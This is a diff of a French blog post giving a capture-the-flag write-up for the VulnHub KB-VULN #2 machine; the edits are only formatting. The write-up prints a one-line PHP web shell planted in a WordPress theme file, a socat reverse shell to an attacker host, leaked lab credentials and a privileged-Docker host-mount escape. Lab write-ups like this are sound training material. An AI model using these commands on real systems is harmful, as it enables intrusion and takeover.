@@ -1,5 +1,5 @@
 ---
-title: Solution du CTF KB-VULN #2 de VulnHub
+title: "Solution du CTF KB-VULN #2 de VulnHub"
 tags: [CTF, VulnHub]
 ---
 
@@ -51,7 +51,7 @@ Host script results:
 |   FQDN: kb-server
 ```
 
-Sur le serveur web on trouve via énumération des dossiers un wordpress installé. Le module *wp\_enum* de *Wapiti* détecte quelques plugins et thèmes mais rien de critique :  
+Sur le serveur web, on trouve via énumération des dossiers un wordpress installé. Le module `wp_enum` de *Wapiti* détecte quelques plugins et thèmes, mais rien de critique :  
 
 ```
 [*] Lancement du module wp_enum
@@ -64,7 +64,7 @@ twentyseventeen  détecté
 twentynineteen 1.7 détecté
 ```
 
-Avec l'aide de *wpscan* j'obtiens la version du Wordpress :  
+Avec l'aide de `wpscan` j'obtiens la version du Wordpress :  
 
 ```
 [+] WordPress version 5.5.1 identified (Insecure, released on 2020-09-01).
@@ -76,7 +76,7 @@ Avec l'aide de *wpscan* j'obtiens la version du Wordpress :
 
 Là encore rien de critique. Direction Samba sur lequel on trouve un disque partagé avec une archive zip :  
 
-```bash
+```console
 $ smbclient  -U "" -N -L //192.168.56.6
 
         Sharename       Type      Comment
@@ -98,7 +98,7 @@ smb: \> get backup.zip
 getting file \backup.zip of size 16735117 as backup.zip (80905,3 KiloBytes/sec) (average 80905,4 KiloBytes/sec)
 ```
 
-A l'intérieur on trouve entre autres un fichier *remember\_me.txt* avec le contenu suivant :  
+À l'intérieur, on trouve entre autres un fichier `remember_me.txt` avec le contenu suivant :  
 
 ```
 Username:admin
@@ -117,11 +117,11 @@ define( 'DB_USER', 'kb_vuln' );
 define( 'DB_PASSWORD', 'hellelujah' );
 ```
 
-Le mot de passe *MachineBoy141* ne permet pas un accès sur SSH / SMB mais permet d'accéder à la zone d'administration du Wordpress.  
+Le mot de passe `MachineBoy141` ne permet pas un accès sur SSH / SMB mais permet d'accéder à la zone d'administration du Wordpress.  
 
-La technique habituelle consiste à éditer un fichier PHP via l'interface de Wordpress. On peut éditer les fichiers des thèmes installés mais tous ne permettent pas la modification (en raison des permissions sur les fichiers).  
+La technique habituelle consiste à éditer un fichier PHP via l'interface de Wordpress. On peut éditer les fichiers des thèmes installés, mais tous ne permettent pas la modification (en raison des permissions sur les fichiers).  
 
-Finalement j'ai édité le fichier *wp-content/themes/twentynineteen/404.php* pour y mettre le code suivant au début :  
+Finalement j'ai édité le fichier `wp-content/themes/twentynineteen/404.php` pour y mettre le code suivant au début :  
 
 ```php
 if (isset($_GET["cmd"])) { echo "<pre>"; system($_GET["cmd"]); echo "</pre>"; }
@@ -130,7 +130,7 @@ if (isset($_GET["cmd"])) { echo "<pre>"; system($_GET["cmd"]); echo "</pre>"; }
 2 Furieux
 ---------
 
-D'après les interfaces réseau on est dans un Docker :  
+D'après les interfaces réseau, on est dans un Docker :  
 
 ```
 3: docker0:  mtu 1500 qdisc noqueue state DOWN group default 
@@ -139,7 +139,7 @@ D'après les interfaces réseau on est dans un Docker :
  valid\_lft forever preferred\_lft forever
 ```
 
-*socat* est présent alors j'en profite pour récupérer un reverse shell avec PTY.  
+`socat` est présent alors j'en profite pour récupérer un reverse shell avec PTY.  
 
 Côté attaquant : 
 ```bash
@@ -151,15 +151,15 @@ Côté victime :
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
 ```
 
-En réutilisant les identifiants SQL je fouille dans le serveur MySQL local mais je ne trouve rien d'intéressant.  
+En réutilisant les identifiants SQL je fouille dans le serveur MySQL local, mais je ne trouve rien d'intéressant.  
 
-Il y a un utilisateur *kbadmin* sur la machine et il utilise le même mot de passe que le Wordpress (*MachineBoy141*) on peut accéder au compte via la commande *su*.  
+Il y a un utilisateur `kbadmin` sur la machine et il utilise le même mot de passe que le Wordpress (`MachineBoy141`) on peut accéder au compte via la commande `su`.  
 
 On peut se connecter aussi directement via SSH mais le service est dans le container donc aucun gain.  
 
-L'utilisateur a des autorisations *sudo* pour passer root :  
+L'utilisateur a des autorisations `sudo` pour passer root :  
 
-```
+```console
 kbadmin@kb-server:/$ sudo -l
 [sudo] password for kbadmin: 
 Matching Defaults entries for kbadmin on kb-server:
@@ -173,13 +173,13 @@ root@kb-server:~# cat flag.txt
 dc387b4cf1a4143f562dd1bdb3790ff1
 ```
 
-Toutefois on est toujours dans le container, il est temps de s'échapper. Là encore on va employer une technique classique d'escalade de privilèges via Docker consistant à monter le disque de l'hôte dans le container.  
+Toutefois, on est toujours dans le container, il est temps de s'échapper. Là encore on va employer une technique classique d'escalade de privilèges via Docker consistant à monter le disque de l'hôte dans le container.  
 
 [Voir ici](https://www.trendmicro.com/en_us/research/19/l/why-running-a-privileged-container-in-docker-is-a-bad-idea.html) pour plus d'informations sur les risques de lancer un container Docker avec privilèges.  
 
-Mon problème est que la VM n'a pas d'accès Internet, je ne peux donc pas faire un simple Docker pull. A la place je vais créer une archive d'une image Alpine Linux pour la copier ensuite dans la VM.  
+Mon problème est que la VM n'a pas d'accès Internet, je ne peux donc pas faire un simple Docker pull. À la place, je vais créer une archive d'une image _Alpine Linux_ pour la copier ensuite dans la VM.  
 
-```bash
+```console
 $ docker pull alpine
 Using default tag: latest
 latest: Pulling from library/alpine
@@ -195,9 +195,9 @@ alpine              latest    c059bfaa849c   12 days ago    5.58MB
 $ docker save --output alpine.tar c059bfaa849c
 ```
 
-Ensuite je charge l'image et l'exécute en montant le */root* de l'hôte :  
+Ensuite je charge l'image et l'exécute en montant le `/root` de l'hôte :  
 
-```bash
+```console
 kbadmin@kb-server:~$ docker load --input alpine.tar
 8d3ac3489996: Loading layer [==================================================>]  5.866MB/5.866MB
 Loaded image ID: sha256:c059bfaa849c4d8e4aecaeb3a10c2d9b3d85f5165c66ad3a4d937758128c4d18
@@ -213,6 +213,5 @@ dc387b4cf1a4143f562dd1bdb3790ff1
 ```
 
 Evalal'travail !  
-
 
 *Published December 08 2021 at 12:07*
